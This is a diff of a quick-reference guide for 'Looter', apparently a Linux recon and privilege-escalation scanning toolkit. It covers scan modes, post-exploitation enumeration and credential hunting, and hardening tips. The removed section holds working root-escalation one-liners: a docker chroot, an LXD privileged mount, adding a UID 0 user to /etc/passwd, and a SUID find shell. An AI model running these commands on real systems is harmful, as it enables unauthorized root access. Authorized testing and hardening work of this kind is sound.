@@ -1,201 +1,382 @@
-# Looter Quick Reference Guide
+# Looter - Quick Reference Guide
 
 ## 🚀 Quick Start
 
 ```bash
-# Clone and run (requires authorization!)
-git clone https://github.com/supunhg/Looter.git
-cd Looter
-chmod +x system_scan.sh
-sudo ./system_scan.sh
+# Interactive menu (recommended)
+./looter.sh
+
+# Direct execution
+./basic_scan.sh --target 192.168.1.100
+./intermediate_scan.sh --target 192.168.1.100
+./deep_scan_online.sh --target 192.168.1.100
+./deep_scan_offline.sh
 ```
-
-## 📋 Output Files
-
-- `system_scan_YYYY-MM-DD_HH-MM-SS.txt` - Complete scan report
-
-## 🎨 Color Coding (Advanced Priority System)
-
-| Color/Format | Meaning | Example |
-|--------------|---------|---------|
-| **Red Box** | 99% PE Vector | Privileged Docker container |
-| **Red Text [!]** | 95% PE Vector | Member of docker group |
-| **Yellow Text [*]** | 75% PE Vector | Compilers available |
-| **Cyan Text [+]** | Interesting | Configuration files found |
-
-## ⚡ Quick Configuration Presets
-
-### Minimal Scan (Fast)
-```bash
-SCAN_BASIC_SYSTEM=true
-SCAN_NETWORK=true
-SCAN_SERVICES=true
-# All others = false
-```
-
-### Security Audit (Recommended)
-```bash
-SCAN_PRIVILEGE_ESCALATION=true
-SCAN_SECURITY_AUDIT=true
-SCAN_SSH_ANALYSIS=true
-SCAN_USERS_AUTH=true
-CHECK_SUID_SGID=true
-CHECK_SUDO_MISCONFIG=true
-CHECK_INTERESTING_GROUPS=true
-```
-
-### Cloud Instance Analysis
-```bash
-SCAN_CLOUD_DETECTION=true
-SCAN_INTERESTING_FILES=true
-SCAN_ENVIRONMENT_ANALYSIS=true
-```
-
-### Full Red Team Scan (Slow but Complete)
-```bash
-# Enable everything
-# All SCAN_* = true
-# All CHECK_* = true
-```
-
-## 🎯 Top 10 Privilege Escalation Vectors
-
-### 99% PE (Critical)
-1. **Docker socket in container** - `docker run -v /var/run/docker.sock:/var/run/docker.sock`
-2. **Member of docker group** - `groups | grep docker`
-3. **Writable /etc/passwd** - `[ -w /etc/passwd ]`
-4. **AWS IAM credentials** - Metadata service accessible
-5. **NFS no_root_squash** - `/etc/exports`
-
-### 95% PE (High)
-6. **NOPASSWD sudo ALL** - `sudo -l`
-7. **Readable /etc/shadow** - `[ -r /etc/shadow ]`
-8. **Member of lxd group** - Container privilege escalation
-9. **Writable systemd service** - Service file modification
-10. **pkexec SUID** - CVE-2021-4034 (PwnKit)
-
-## 🔍 Manual Checks After Running Looter
-
-1. **Review all CRITICAL findings** - Address immediately
-2. **Check AWS/Azure/GCP metadata** - If cloud detected
-3. **Examine writable paths** - Potential hijacking
-4. **Review group memberships** - Especially docker, lxd, disk
-5. **Check SUID binaries** - Cross-reference with GTFOBins
-6. **Analyze bash history** - Credentials or patterns
-7. **Verify kernel version** - Check exploit-db
-8. **Test sudo privileges** - `sudo -l`
-9. **Check capabilities** - `getcap -r / 2>/dev/null`
-10. **Review cron jobs** - `/etc/cron*` and user crontabs
-
-## 🛠️ Common Exploitation Techniques
-
-### Docker Group Escalation
-```bash
-docker run -v /:/mnt --rm -it alpine chroot /mnt sh
-```
-
-### LXD Group Escalation
-```bash
-lxc init ubuntu:18.04 ignite -c security.privileged=true
-lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
-lxc start ignite
-lxc exec ignite /bin/bash
-```
-
-### Writable /etc/passwd
-```bash
-echo 'hacker::0:0:root:/root:/bin/bash' >> /etc/passwd
-su hacker
-```
-
-### SUID Binary Exploitation
-```bash
-# If find has SUID
-find . -exec /bin/sh -p \; -quit
-```
-
-## 📊 Vulnerability Score Interpretation
-
-| Score | Risk Level | Action Required |
-|-------|-----------|-----------------|
-| 50+ | CRITICAL | Immediate remediation |
-| 30-49 | HIGH | Remediate within 24h |
-| 15-29 | ELEVATED | Remediate within 1 week |
-| 5-14 | MODERATE | Remediate within 1 month |
-| <5 | LOW | Monitor and review |
-
-## 🔐 Top Security Hardening Tips
-
-1. **Disable root SSH login** - `PermitRootLogin no`
-2. **Use key-based SSH auth** - `PasswordAuthentication no`
-3. **Enable SELinux/AppArmor** - Mandatory access control
-4. **Remove unnecessary SUID** - `chmod u-s /path/to/binary`
-5. **Restrict sudo access** - Minimal NOPASSWD entries
-6. **Enable firewall** - `ufw enable`
-7. **Regular updates** - `apt update && apt upgrade`
-8. **Audit group memberships** - Remove users from docker/lxd
-9. **Secure NFS exports** - Avoid no_root_squash
-10. **Monitor logs** - Check auth logs regularly
-
-## 🌐 Network Scanning Tips
-
-### Fast Scan (1 minute)
-```bash
-NETWORK_SCAN_TIMEOUT=1
-NETWORK_SCAN_THREADS=100
-```
-
-### Thorough Scan (5+ minutes)
-```bash
-NETWORK_SCAN_TIMEOUT=2
-NETWORK_SCAN_THREADS=50
-# Ensure nmap is installed
-```
-
-## 📱 Integration with Other Tools
-
-### Export for Further Analysis
-```bash
-# Extract IPs for nmap
-grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" system_scan_*.txt | sort -u > ips.txt
-
-# Extract SUID binaries
-grep "SUID" system_scan_*.txt > suid_binaries.txt
-
-# Extract vulnerabilities only
-grep -E "\[CRITICAL\]|\[HIGH\]" system_scan_*.txt > critical_findings.txt
-```
-
-### Feed into Metasploit
-```bash
-# Use discovered services/versions to search exploits
-msfconsole
-> search <service_name> <version>
-```
-
-## 🆘 Troubleshooting
-
-### Script Hangs
-- Disable `SCAN_NETWORK_DISCOVERY=false`
-- Reduce `NETWORK_SCAN_THREADS=20`
-
-### Permission Denied Errors
-- Run with `sudo`
-- Some checks require root privileges
-
-### Too Much Output
-- Disable verbose: `OUTPUT_VERBOSE=false`
-- Disable specific modules
-- Use `grep` to filter results
-
-## 📧 Support & Licensing
-
-**Author:** Supun Hewagamage  
-**GitHub:** https://github.com/supunhg  
-**License:** Proprietary - Explicit permission required
-
-**For authorized use or licensing inquiries, contact via GitHub.**
 
 ---
 
-**Remember: This tool is for authorized security testing only. Unauthorized access is illegal.**
+## 📋 Scan Type Cheat Sheet
+
+### 1. Basic Scan - Quick Recon
+```bash
+./basic_scan.sh [OPTIONS]
+```
+**Time:** 1-5 minutes | **Internet:** Not Required
+
+**Options:**
+- `--target, -t <IP>`    Target host (default: 127.0.0.1)
+- `--out, -o <FILE>`     Output file (default: auto)
+- `-h, --help`           Show help
+
+**What it does:**
+- ✓ Hardware info (CPU, RAM, Disk)
+- ✓ Software versions
+- ✓ Active services
+- ✓ Open ports
+- ✓ Network config
+- ✓ User accounts
+
+**Use when:** Quick recon, time-limited, live network scanning
+
+---
+
+### 2. Intermediate Scan - Security Check
+```bash
+./intermediate_scan.sh [OPTIONS]
+```
+**Time:** 5-15 minutes | **Internet:** Not Required
+
+**Options:**
+- `--target, -t <IP>`    Target host
+- `--out, -o <FILE>`     Output file
+- `-h, --help`           Show help
+
+**What it does:**
+- ✓ Everything from Basic Scan
+- ✓ Known vulnerabilities
+- ✓ Outdated software detection
+- ✓ Security misconfigurations
+- ✓ Risk scoring
+
+**Use when:** Security audits, compliance checks, vulnerability assessment
+
+---
+
+### 3. Deep Scan (Online) - Full Pentest
+```bash
+./deep_scan_online.sh [OPTIONS]
+```
+**Time:** 15-45 minutes | **Internet:** ⚠️ REQUIRED
+
+**Options:**
+- `--target, -t <IP>`    Target host
+- `--out, -o <FILE>`     Output file
+- `-h, --help`           Show help
+
+**What it does:**
+- ✓ Everything from Intermediate
+- ✓ CVE database queries
+- ✓ Exploit suggestions
+- ✓ Metasploit modules
+- ✓ Web app scanning
+- ✓ Comprehensive reporting
+
+**Use when:** Penetration testing, red team, security research
+
+---
+
+### 4. Deep Scan (Offline) - Complete Audit
+```bash
+./deep_scan_offline.sh
+```
+**Time:** 10-30 minutes | **Internet:** Not Required
+
+**No options** - Scans local system comprehensively
+
+**What it does:**
+- ✓ All scans (except online CVE)
+- ✓ Privilege escalation vectors
+- ✓ Container escape detection
+- ✓ Credential hunting
+- ✓ File permission analysis
+- ✓ Cloud instance detection
+
+**Use when:** Post-compromise, offline audits, CTF challenges
+
+---
+
+## 🎯 Common Use Cases
+
+### Scenario 1: Initial Network Recon
+```bash
+./basic_scan.sh --target 10.10.10.0/24
+```
+
+### Scenario 2: Security Audit
+```bash
+./intermediate_scan.sh --target webserver.local --out audit_report.txt
+```
+
+### Scenario 3: Penetration Test
+```bash
+./deep_scan_online.sh --target victim.htb --out pentest_full.txt
+```
+
+### Scenario 4: Post-Exploitation Enumeration
+```bash
+# After gaining shell access
+./deep_scan_offline.sh
+```
+
+### Scenario 5: CTF Machine
+```bash
+# Quick overview
+./basic_scan.sh
+
+# Find privilege escalation vectors
+./deep_scan_offline.sh
+grep -i "critical\|high" system_scan_*.txt
+```
+
+---
+
+## 🔍 Finding Specific Information
+
+### Find SUID Binaries
+```bash
+./deep_scan_offline.sh
+grep -A 10 "SUID binaries" system_scan_*.txt
+```
+
+### Check for Kernel Exploits
+```bash
+./intermediate_scan.sh
+grep -i "kernel\|dirty" intermediate_scan_*.txt
+```
+
+### Find CVEs for Target
+```bash
+./deep_scan_online.sh --target 192.168.1.50
+grep "CVE-" deep_scan_online_*.txt
+```
+
+### Detect Containers
+```bash
+./deep_scan_offline.sh
+grep -i "docker\|container" system_scan_*.txt
+```
+
+### Find Credentials
+```bash
+./deep_scan_offline.sh
+grep -A 5 "PASSWORD\|CREDENTIAL" system_scan_*.txt
+```
+
+---
+
+## 📊 Understanding Output
+
+### Risk Levels
+- **CRITICAL** - Immediate exploitation possible
+- **HIGH** - Significant security risk
+- **MEDIUM** - Moderate security concern
+- **LOW** - Minor security issue
+
+### Vulnerability Markers
+```
+[CRITICAL] - Red - Immediate action required
+[HIGH]     - Red - High priority
+[MEDIUM]   - Yellow - Should address
+[LOW]      - Cyan - Good to fix
+```
+
+### Information Markers
+```
+[*] - Information
+[✓] - Success
+[!] - Warning
+[✗] - Error
+```
+
+---
+
+## 🛠️ Troubleshooting
+
+### "nmap not found"
+```bash
+sudo apt install nmap
+```
+
+### "Permission denied"
+```bash
+chmod +x *.sh
+```
+
+### "No internet connection" (Deep Scan Online)
+- Check network: `ping 8.8.8.8`
+- Use offline scan instead: `./deep_scan_offline.sh`
+
+### "Command not found: searchsploit"
+```bash
+sudo apt install exploitdb
+```
+
+### Scan takes too long
+- Use Basic Scan for quick results
+- Reduce network discovery scope
+- Edit deep_scan_offline.sh config section
+
+---
+
+## 📁 Output Files
+
+| Scan Type | Default Filename | Format |
+|-----------|-----------------|--------|
+| Basic | basic_scan_YYYYMMDD_HHMMSS.txt | Text |
+| Intermediate | intermediate_scan_YYYYMMDD_HHMMSS.txt | Text |
+| Deep (Online) | deep_scan_online_YYYYMMDD_HHMMSS.txt | Text |
+| Deep (Offline) | system_scan_YYYY-MM-DD_HH-MM-SS.txt | Text |
+
+---
+
+## ⚡ Performance Tips
+
+### Speed Up Scans
+1. Limit port range in scripts
+2. Reduce network discovery timeout
+3. Skip optional modules
+4. Use Basic Scan for quick checks
+
+### Improve Accuracy
+1. Install all recommended tools
+2. Run with sudo (for deeper access)
+3. Increase timeout values
+4. Enable all scan modules
+
+---
+
+## 🔐 Security Best Practices
+
+### Before Scanning
+1. ✅ Get written authorization
+2. ✅ Verify target scope
+3. ✅ Check legal implications
+4. ✅ Prepare incident response
+
+### During Scanning
+1. ✅ Monitor scan impact
+2. ✅ Respect rate limits
+3. ✅ Document findings
+4. ✅ Keep evidence secure
+
+### After Scanning
+1. ✅ Secure report files
+2. ✅ Report vulnerabilities responsibly
+3. ✅ Follow disclosure policies
+4. ✅ Delete sensitive data
+
+---
+
+## 🎓 Tips & Tricks
+
+### Combine with Other Tools
+```bash
+# Use with LinPEAS
+./deep_scan_offline.sh && ./linpeas.sh
+
+# Compare results
+./basic_scan.sh --out before.txt
+# Make changes
+./basic_scan.sh --out after.txt
+diff before.txt after.txt
+```
+
+### Grep Useful Patterns
+```bash
+# Find all vulnerabilities
+grep -E "CRITICAL|HIGH" *scan*.txt
+
+# Find exploits
+grep -i "exploit" *scan*.txt
+
+# Find CVEs
+grep -oP "CVE-\d{4}-\d+" *scan*.txt | sort -u
+```
+
+### Export Results
+```bash
+# Convert to markdown
+cat basic_scan_*.txt | pandoc -o report.md
+
+# Create PDF
+enscript -B basic_scan_*.txt -o - | ps2pdf - report.pdf
+```
+
+---
+
+## 📞 Getting Help
+
+### Command Help
+```bash
+./looter.sh --help
+./basic_scan.sh --help
+./intermediate_scan.sh --help
+./deep_scan_online.sh --help
+```
+
+### Common Issues
+1. **Scan hangs** - Check network connectivity, reduce timeout
+2. **Permission errors** - Run with appropriate privileges
+3. **Missing tools** - Install required packages
+4. **Large output** - Use grep to filter results
+
+---
+
+## 🔗 Related Resources
+
+- **ExploitDB:** https://www.exploit-db.com/
+- **NIST NVD:** https://nvd.nist.gov/
+- **GTFOBins:** https://gtfobins.github.io/
+- **HackTricks:** https://book.hacktricks.xyz/
+
+---
+
+## 📝 Report Template
+
+```
+Target: [IP/Hostname]
+Scan Type: [Basic/Intermediate/Deep]
+Date: [YYYY-MM-DD]
+Tester: [Your Name]
+
+=== EXECUTIVE SUMMARY ===
+[Brief overview]
+
+=== FINDINGS ===
+Critical: [Count]
+High: [Count]
+Medium: [Count]
+Low: [Count]
+
+=== TOP VULNERABILITIES ===
+1. [Vulnerability Name]
+   - Severity: [CRITICAL/HIGH/MEDIUM/LOW]
+   - CVE: [CVE-XXXX-XXXXX]
+   - Impact: [Description]
+   - Recommendation: [Fix]
+
+=== DETAILED FINDINGS ===
+[Paste scan output]
+
+=== CONCLUSION ===
+[Summary and recommendations]
+```
+
+---
+
+<div align="center">
+
+**Quick Reference v1.0**  
+For full documentation see README.md
+
+</div>
